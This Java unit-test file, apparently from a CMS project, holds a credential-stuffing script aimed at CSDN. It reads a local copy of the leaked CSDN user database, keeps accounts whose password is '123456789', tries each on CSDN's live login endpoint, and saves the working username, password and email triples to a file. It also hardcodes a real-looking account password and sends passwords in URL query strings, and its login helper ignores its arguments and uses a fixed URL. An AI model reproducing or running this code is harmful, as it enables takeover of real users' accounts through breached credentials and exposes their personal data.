package com.fpcms.common.util;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.PrintWriter;
import java.net.URL;
import java.net.URLConnection;

import org.apache.commons.io.IOUtils;
import org.apache.commons.lang.StringUtils;
import org.junit.Test;


public class NetUtilTest {

	
	@Test
	public void readCsdn() throws Exception {
		BufferedReader reader = new BufferedReader(new FileReader("E:/temp/www.csdn.net.sql"),1024 * 30);
		String line;
		int count = 0;
		PrintWriter writer = new PrintWriter(new FileWriter("e:/temp/csdn_login_success_users.txt"));
		while((line = reader.readLine()) != null) {
			count++;
			String[] array = StringUtils.split(line,'#');
			String username = StringUtils.trim(array[0]);
			String password = StringUtils.trim(array[1]);
			String email = StringUtils.trim(array[2]);
			String loginPassword = "123456789";
			if(count > 1000000 * 6 && password.equals(loginPassword) && csdnLoginBySimple(username, loginPassword)) {
				String loginSuccessMsg = username+"\t"+loginPassword+"\t"+email;
				System.err.println(loginSuccessMsg);
				writer.println(loginSuccessMsg);
			}
			if(count % 10 == 0) {
				writer.flush();
			}
		}
		
	}
	@Test
	public void test() throws Exception {
		URL url = new URL("https://passport.csdn.net/account/login");
		URLConnection conn = url.openConnection();
		conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 5.1; rv:14.0) Gecko/20100101 Firefox/14.0.1");
		conn.setRequestProperty("Accept-Language", "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3");
		conn.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
		conn.connect();
		String str = conn.getHeaderField("Set-Cookie");
		System.out.println("Set-Cookie:"+str);
		System.out.println(IOUtils.toString(conn.getInputStream(),conn.getContentEncoding()));
		
	}
	
	@Test
	public void test_csdnLogin() throws Exception {
		String username = "fpqqchao";
		String password = "asdf@1234";
		String aaa = csdnLogin(username, password);
		System.out.println(aaa);
		System.out.println(csdnLoginBySimple(username,password));
	}

	private String csdnLogin(String username, String password) {
		return NetUtil.httpGet("https://passport.csdn.net/ajax/accounthandler.ashx?t=log&u="+username+"&p="+password+"&remember=0&f=http%3A%2F%2Fwww.csdn.net%2F&rand=0.9777295215841267");
//		return NetUtil.httpGet("https://passport.csdn.net/ajax/accounthandler.ashx?&u=fpqqchao&p=aaaa", "remember=0&t=log&f=http://www.csdn.net&rand="+System.currentTimeMillis()+"&u="+username+"&p="+password);
	}
	
	private boolean csdnLoginBySimple(String username, String password) throws Exception {
		URL url = new URL("https://passport.csdn.net/ajax/accounthandler.ashx?t=log&u=fpqqchao&p=asdf@1231&remember=0&f=http%3A%2F%2Fwww.csdn.net%2F&rand=0.13005178541239493");
		URLConnection conn = url.openConnection();
		conn.setRequestProperty("Accept", "*/*");
		conn.setRequestProperty("Accept-Encoding", "gzip, deflate");
		conn.setRequestProperty("Accept-Language", "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3");
		conn.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
		conn.setRequestProperty("Referer", "https://passport.csdn.net/account/loginbox?callback=logined&hidethird=1&from=http%3a%2f%2fwww.csdn.net%2f");
		conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 5.1; rv:14.0) Gecko/20100101 Firefox/14.0.1");
		conn.setRequestProperty("X-Requested-With","XMLHttpRequest");
		conn.connect();
		String result = IOUtils.toString(conn.getInputStream(),conn.getContentEncoding());
		System.out.println("csdn login:"+username+" pwd:"+password+": result:"+result);
		if(result.contains("用户名或密码错误")) {
			return false;
		}
		return true;
	}
}
